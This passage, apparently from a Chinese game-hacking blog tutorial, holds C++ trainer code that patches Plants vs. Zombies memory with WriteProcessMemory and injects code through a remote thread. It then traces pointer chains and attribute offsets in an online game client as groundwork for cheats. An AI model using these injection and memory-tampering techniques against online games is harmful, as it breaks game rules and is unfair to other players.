class=\"line\">\tUpdateData(FALSE);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedCheck4()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\tUpdateData(TRUE);</span><br><span class=\"line\">\tDWORD dwPid = FindGameProcessidByWndTitle(_T(&quot;植物大战僵尸中文版&quot;));</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class=\"line\">\tif (!hProcess)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;进程打开失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tUCHAR buf[3] = &#123; 0 &#125;;</span><br><span class=\"line\">\tif (m_noblood)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//nop nop</span><br><span class=\"line\">\t\t//禁用cd</span><br><span class=\"line\">\t\tbuf[0] = 0x90;</span><br><span class=\"line\">\t\tbuf[1] = 0x90;</span><br><span class=\"line\">\t\tbuf[2] = 0x90;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//7e 14 </span><br><span class=\"line\">\t\t//启用cd时间</span><br><span class=\"line\">\t\tbuf[0] = 0x0F;</span><br><span class=\"line\">\t\tbuf[1] = 0x95;</span><br><span class=\"line\">\t\tbuf[2] = 0xC0;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tif (!::WriteProcessMemory(hProcess, (LPVOID)(0x0052FCF0), buf, sizeof(buf), NULL))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;写入数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tCloseHandle(hProcess);</span><br><span class=\"line\">\tUpdateData(FALSE);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedCheck5()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\tUpdateData(TRUE);</span><br><span class=\"line\">\tDWORD dwPid = FindGameProcessidByWndTitle(_T(&quot;植物大战僵尸中文版&quot;));</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class=\"line\">\tif (!hProcess)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;进程打开失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tUCHAR buf[2] = &#123; 0 &#125;;</span><br><span class=\"line\">\tif (no_pit)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//nop nop</span><br><span class=\"line\">\t\t//禁用cd</span><br><span class=\"line\">\t\tbuf[0] = 0x90;</span><br><span class=\"line\">\t\tbuf[1] = 0x90;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//7e 14 </span><br><span class=\"line\">\t\t//启用cd时间</span><br><span class=\"line\">\t\tbuf[0] = 0x75;</span><br><span class=\"line\">\t\tbuf[1] = 0x05;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tif (!::WriteProcessMemory(hProcess, (LPVOID)(0x0041D79E), buf, sizeof(buf), NULL))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;写入数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tCloseHandle(hProcess);</span><br><span class=\"line\">\tUpdateData(FALSE);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedCheck6()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\tUpdateData(TRUE);</span><br><span class=\"line\">\tDWORD dwPid = FindGameProcessidByWndTitle(_T(&quot;植物大战僵尸中文版&quot;));</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class=\"line\">\tif (!hProcess)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;进程打开失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tUCHAR buf[2] = &#123; 0 &#125;;</span><br><span class=\"line\">\tif (m_nomubei)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//nop nop</span><br><span class=\"line\">\t\t//禁用cd</span><br><span class=\"line\">\t\tbuf[0] = 0x90;</span><br><span class=\"line\">\t\tbuf[1] = 0x90;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//7e 14 </span><br><span class=\"line\">\t\t//启用cd时间</span><br><span class=\"line\">\t\tbuf[0] = 0x75;</span><br><span class=\"line\">\t\tbuf[1] = 0x5F;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tif (!::WriteProcessMemory(hProcess, (LPVOID)(0x0045FD07), buf, sizeof(buf), NULL))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;写入数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tCloseHandle(hProcess);</span><br><span class=\"line\">\tUpdateData(FALSE);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">DWORD __stdcall CplantDlg::PutAllPlants(LPVOID lpThreadParame)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tpushad</span><br><span class=\"line\">\t\tpush -1</span><br><span class=\"line\">\t\tpush 2</span><br><span class=\"line\">\t\tmov eax, 1</span><br><span class=\"line\">\t\tpush 1</span><br><span class=\"line\">\t\tmov ebx, dword ptr ds:[0x6A9EC0]</span><br><span class=\"line\">\t\tmov ebx, dword ptr ds:[ebx + 0x768]</span><br><span class=\"line\">\t\tpush ebx</span><br><span class=\"line\">\t\tmov edx, 0x0040D120</span><br><span class=\"line\">\t\tcall edx</span><br><span class=\"line\">\t\tpopad</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedButton7()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\tUpdateData(TRUE);   //从页面读取变量</span><br><span class=\"line\">\tCString strPlantName = _T(&quot;&quot;);</span><br><span class=\"line\">\tDWORD dwPlantID = 0;</span><br><span class=\"line\">\tDWORD dwPid = 0;</span><br><span class=\"line\"></span><br><span class=\"line\">\tm_cbPlantsChoose.GetWindowText(strPlantName);</span><br><span class=\"line\">\tdwPlantID = GetPlantsIDByName(strPlantName);</span><br><span class=\"line\"></span><br><span class=\"line\">\t//打开进程</span><br><span class=\"line\">\tdwPid = FindGameProcessidByWndTitle(_T(&quot;植物大战僵尸中文版&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\">\t//远程调用参数</span><br><span class=\"line\">\tPutPlantsPareame parame;</span><br><span class=\"line\">\tparame.u_plantID = dwPlantID;</span><br><span class=\"line\">\tparame.u_x = m_x;</span><br><span class=\"line\">\tparame.u_y = m_y;</span><br><span class=\"line\"></span><br><span class=\"line\">\t</span><br><span class=\"line\">\tif (!InjectRemoteFunc(dwPid, PutAllPlants, &amp;parame, sizeof(parame)))</span><br><span class=\"line\">\t\tMessageBox(_T(&quot;远程调用失败&quot;), NULL, 0);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedCheck7()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\tUpdateData(TRUE);</span><br><span class=\"line\">\tDWORD dwPid = FindGameProcessidByWndTitle(_T(&quot;植物大战僵尸中文版&quot;));</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class=\"line\">\tif (!hProcess)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;进程打开失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tUCHAR buf[6] = &#123; 0 &#125;;</span><br><span class=\"line\">\tif (m_tudou)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//nop nop</span><br><span class=\"line\">\t\t//禁用cd</span><br><span class=\"line\">\t\tbuf[0] = 0x90;</span><br><span class=\"line\">\t\tbuf[1] = 0x90;</span><br><span class=\"line\">\t\tbuf[2] = 0x90;</span><br><span class=\"line\">\t\tbuf[3] = 0x90;</span><br><span class=\"line\">\t\tbuf[4] = 0x90;</span><br><span class=\"line\">\t\tbuf[5] = 0x90;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//7e 14 </span><br><span class=\"line\">\t\t//启用cd时间</span><br><span class=\"line\">\t\tbuf[0] = 0x0F;</span><br><span class=\"line\">\t\tbuf[1] = 0x85;</span><br><span class=\"line\">\t\tbuf[2] = 0xFA;</span><br><span class=\"line\">\t\tbuf[3] = 0x01;</span><br><span class=\"line\">\t\tbuf[4] = 0x00;</span><br><span class=\"line\">\t\tbuf[5] = 0x00;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tif (!::WriteProcessMemory(hProcess, (LPVOID)(0x0045FE53), buf, sizeof(buf), NULL))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;写入数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tCloseHandle(hProcess);</span><br><span class=\"line\">\tUpdateData(FALSE);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedCheck8()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\tUpdateData(TRUE);</span><br><span class=\"line\">\tDWORD dwPid = FindGameProcessidByWndTitle(_T(&quot;植物大战僵尸中文版&quot;));</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class=\"line\">\tif (!hProcess)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;进程打开失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tUCHAR buf[3] = &#123; 0 &#125;;</span><br><span class=\"line\">\tif (m_frozen)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//nop nop</span><br><span class=\"line\">\t\t//禁用cd</span><br><span class=\"line\">\t\tbuf[0] = 0x83;</span><br><span class=\"line\">\t\tbuf[1] = 0xC0;</span><br><span class=\"line\">\t\tbuf[2] = 0x01;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//7e 14 </span><br><span class=\"line\">\t\t//启用cd时间</span><br><span class=\"line\">\t\tbuf[0] = 0x83;</span><br><span class=\"line\">\t\tbuf[1] = 0xC0;</span><br><span class=\"line\">\t\tbuf[2] = 0xFD;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tif (!::WriteProcessMemory(hProcess, (LPVOID)(0x0052B41F), buf, sizeof(buf), NULL))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;写入数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tCloseHandle(hProcess);</span><br><span class=\"line\">\tUpdateData(FALSE);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"6网游辅助实战训练\"><a class=\"markdownIt-Anchor\" href=\"#6网游辅助实战训练\">#</a> 6. 网游辅助实战训练</h3>\n<p>LoadLibrary    // 加载模块</p>\n<p>FreeLibrary    // 卸载模块</p>\n<p>CreateRemoteThread    // 创建远程线程</p>\n<p>GetModuleHandle      // 通过模块名称获取模块句柄</p>\n<h4 id=\"角色人物分析\"><a class=\"markdownIt-Anchor\" href=\"#角色人物分析\">#</a> 角色人物分析</h4>\n<p>角色名</p>\n<p>血量</p>\n<p>魔法</p>\n<p>等级</p>\n<p>职业</p>\n<p>找人物的属性信息，其实是找 this 指针，通过偏移来找人物属性</p>\n<p>1. 人物真气</p>\n<p>1.CE 搜索真气值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00B2CC25 - 89 86 8C070000        - mov [esi+0000078C],eax</span><br><span class=\"line\">eax = 00000212</span><br><span class=\"line\">esi = 15E71F60   5B14C038</span><br><span class=\"line\">当前血量 = [esi + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00B2CB07 - 8B F1                 - mov esi,ecx</span><br><span class=\"line\">ECX = 514FA270</span><br><span class=\"line\">当前血量 = [ECX + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00B37131 - 56                    - push esi</span><br><span class=\"line\">00B37132 - E8 C959FFFF           - call 00B2CB00</span><br><span class=\"line\">00B37137 - B0 01                 - mov al,01 &#123; 1 &#125;</span><br><span class=\"line\">ecx = 514FA270</span><br><span class=\"line\"></span><br><span class=\"line\">00BEF846 - 8B 10                 - mov edx,[eax]</span><br><span class=\"line\">00BEF848 - FF 52 68              - call dword ptr [edx+68]</span><br><span class=\"line\">00BEF84B - B0 01                 - mov al,01 &#123; 1 &#125;</span><br><span class=\"line\">ecx = 514FA270</span><br><span class=\"line\"></span><br><span class=\"line\">00BEF844 - 8B C8                 - mov ecx,eax</span><br><span class=\"line\">eax = 514FA270</span><br><span class=\"line\">当前血量 = [EAX + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00BED9C0 - 8B 41 08              - mov eax,[ecx+08]</span><br><span class=\"line\">eax = 265489C0 ecx = 063A9708</span><br><span class=\"line\">00BED9C3 - 8B 40 30              - mov eax,[eax+30]</span><br><span class=\"line\">00BED9C6 - C3                    - ret </span><br><span class=\"line\">eax = 514FA270</span><br><span class=\"line\">当前血量 = [[[ecx+08]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00BEFDBB  | E8 00DCFFFF          | call elementclient.BED9C0                 |</span><br><span class=\"line\"></span><br><span class=\"line\">00BEFDB9  | 8BCB                 | mov ecx,ebx                               |</span><br><span class=\"line\">当前血量 = [[[ebx+08]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00BEFBCB  | 8BD9                 | mov ebx,ecx                               |</span><br><span class=\"line\">当前血量 = [[[ecx+08]+30] + 78C]</span><br><span class=\"line\">BCB F51</span><br><span class=\"line\"></span><br><span class=\"line\">009BBED5  | FFD0                 | call eax                                  |</span><br><span class=\"line\"></span><br><span class=\"line\">009BBECB  | 8B0F                 | mov ecx,dword ptr ds:[edi]                |</span><br><span class=\"line\">当前血量 = [[[[edi]+08]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">009BBEC1  | 83C7 1C              | add edi,1C                                |</span><br><span class=\"line\">当前血量 = [[[[edi+1c]+08]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">009BBEB9  | 8B78 1C              | mov edi,dword ptr ds:[eax+1C]             |</span><br><span class=\"line\">当前血量 = [[[[[eax+1C]+1c]+08]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">009BBEAE  | 8B40 1C              | mov eax,dword ptr ds:[eax+1C]             | eax:&quot;ff&amp;?&quot;</span><br><span class=\"line\">当前血量 = [[[[[[eax+1C]+1C]+1c]+08]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">009BBEA4  | A1 A8DD4F01          | mov eax,dword ptr ds:[14FDDA8]            |</span><br><span class=\"line\">当前血量 = [[[[[[[14FDDA8]+1C]+1C]+1C]+08]+30] + 78C]</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00B2E1C5 - 89 86 8C070000        - mov [esi+0000078C],eax</span><br><span class=\"line\">esi = 4098A518</span><br><span class=\"line\">当前血量 = [esi + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00B2E0A7  | 8BF1                    | mov esi,ecx                          |</span><br><span class=\"line\">当前血量 = [ecx + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00B38612  | E8 895AFFFF             | call elementclient.B2E0A0            |</span><br><span class=\"line\">ecx = 4098A518</span><br><span class=\"line\"></span><br><span class=\"line\">00BF0808  | FF52 68                 | call dword ptr ds:[edx+68]           | </span><br><span class=\"line\"></span><br><span class=\"line\">00BF0804  | 8BC8                    | mov ecx,eax                          |</span><br><span class=\"line\">eax = 4098A518</span><br><span class=\"line\">当前血量 = [eax + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00BEE980  | 8B41 08                 | mov eax,dword ptr ds:[ecx+8]         |</span><br><span class=\"line\">00BEE983  | 8B40 30                 | mov eax,dword ptr ds:[eax+30]        |</span><br><span class=\"line\">00BEE986  | C3                      | ret                                  |</span><br><span class=\"line\">当前血量 = [[[ecx+8]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00BE3ED9  | FF50 34                 | call dword ptr ds:[eax+34]           |</span><br><span class=\"line\"></span><br><span class=\"line\">00BE3ECB  | 8B4C88 1C               | mov ecx,dword ptr ds:[eax+ecx*4+1C]  |</span><br><span class=\"line\">当前血量 = [[[[eax+ecx*4+1C]+8]+30] + 78C]</span><br><span class=\"line\">eax = 08D8EF00</span><br><span class=\"line\">ecx = 00000001</span><br><span class=\"line\"></span><br><span class=\"line\">00BE3EC1  | 8B46 04                 | mov eax,dword ptr ds:[esi+4]         |</span><br><span class=\"line\">00BE3EC4  | 8B40 1C                 | mov eax,dword ptr ds:[eax+1C]        |</span><br><span class=\"line\">当前血量 = [[[[[[esi+4]+1C]+1*4+1C]+8]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00BE3E98  | 8BF1                    | mov esi,ecx                          |</span><br><span class=\"line\">当前血量 = [[[[[[ecx+4]+1C]+1*4+1C]+8]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00A4A55E  | E8 0D991900             | call elementclient.BE3E70            |</span><br><span class=\"line\"></span><br><span class=\"line\">00A4A553  | 8B8F 98000000           | mov ecx,dword ptr ds:[edi+98]        |</span><br><span class=\"line\">当前血量 = [[[[[[[edi+98]+4]+1C]+1*4+1C]+8]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00A4A4E4  | 8BF9                    | mov edi,ecx                          |</span><br><span class=\"line\">当前血量 = [[[[[[[ecx+98]+4]+1C]+1*4+1C]+8]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00A4A1BF  | E8 1C030000             | call elementclient.A4A4E0            |</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00A4A1B9  | 8BCE                    | mov ecx,esi                          |</span><br><span class=\"line\">当前血量 = [[[[[[[esi+98]+4]+1C]+1*4+1C]+8]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00A4A0B8  | 8BF1                    | mov esi,ecx                          |</span><br><span class=\"line\">当前血量 = [[[[[[[ecx+98]+4]+1C]+1*4+1C]+8]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00A3F231  | E8 7AAE0000             | call elementclient.A4A0B0            |</span><br><span class=\"line\"></span><br><span class=\"line\">00A3F22E  | 8B4F 1C                 | mov ecx,dword ptr ds:[edi+1C]        |</span><br><span class=\"line\">当前血量 = [[[[[[[[edi+1C]+98]+4]+1C]+1*4+1C]+8]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00A3EF57  | 8BF9                    | mov edi,ecx                          | </span><br><span class=\"line\">当前血量 = [[[[[[[[ecx+1C]+98]+4]+1C]+1*4+1C]+8]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00A3F840  | E8 0BF7FFFF             | call elementclient.A3EF50            |</span><br><span class=\"line\"></span><br><span class=\"line\">00A3F83E  | 8BCF                    | mov ecx,edi                          |</span><br><span class=\"line\">当前血量 = [[[[[[[[edi+1C]+98]+4]+1C]+1*4+1C]+8]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00A3F7A5  | 8BF9                    | mov edi,ecx                          |</span><br><span class=\"line\">当前血量 = [[[[[[[[ecx+1C]+98]+4]+1C]+1*4+1C]+8]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00D35072  | E8 29A7D0FF             | call elementclient.A3F7A0            |</span><br><span class=\"line\"></span><br><span class=\"line\">00D3506D  | B9 F8845001             | mov ecx,elementclient.15084F8        |</span><br><span class=\"line\">当前血量 = [[[[[[[[0x15084F8+1C]+98]+4]+1C]+1*4+1C]+8]+30] + 78C]</span><br><span class=\"line\"> [[[[[[[[0x1508514]+98]+4]+1C]+1*4+1C]+8]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$ + 78C 为血量</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 7E4 为血量上限</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 790 为真气</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 7E8 为真气上限</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 784 为等级</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 794 为经验</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 798 为元神</span><br><span class=\"line\"></span><br><span class=\"line\">??? $ + 79C 为元气上限</span><br><span class=\"line\"></span><br><span class=\"line\">$ + B00 / $ + B04 为角色姓名</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 930 为银币</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"../../../AppData/Roaming/Typora/typora-user-images/image-20221222191354658.png\" alt=\"image-20221222191354658\"></p>\n<p>如图可知，this 指针的基地址为 5F7FB0D8</p>\n<p>$ + 78C 为血量</p>\n<p>$ + 7E4 为血量上限</p>\n<p>$ + 790 为真气</p>\n<p>$ + 7E8 为真气上限</p>\n<p>$ + 784 为等级</p>\n<p>$ + 794 为经验</p>\n<p>$ + 798 为元神</p>\n<p>$ + 79C 为元气上限</p>\n<p>34416B58</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">773       77+400=477   +3C  x</span><br><span class=\"line\">177       17           +40  z</span><br><span class=\"line\">-349      -34+550=516  +44  y</span><br></pre></td></tr></table></figure>\n<p>搜索角色名称</p>\n<p>方法 1</p>\n<p>1.ce 搜索角色名称，注意，宽字节和窄字节都要考虑</p>\n<p>2. 使用定位基地址的方式，一个一个关键点网上找</p>\n<p>方法 2（在已知任务角色信息基地址的前提下）</p>\n<p>在 ce 里面搜索</p>\n<p>逐个分析这些地址，找出与任务角色基地址信息相近的地址，然后计算偏移</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221227170809963.png\" alt=\"image-20221227170809963\"></p>\n<p>34417B58-34416B58=B00</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221227170851601.png\" alt=\"image-20221227170851601\"></p>\n<p>释放技能 call 查找</p>\n<p>思路一：技能应该有技能 ID，索引，技能文字信息和描述</p>\n<p>可以从技能文字信息为入口，用 CE 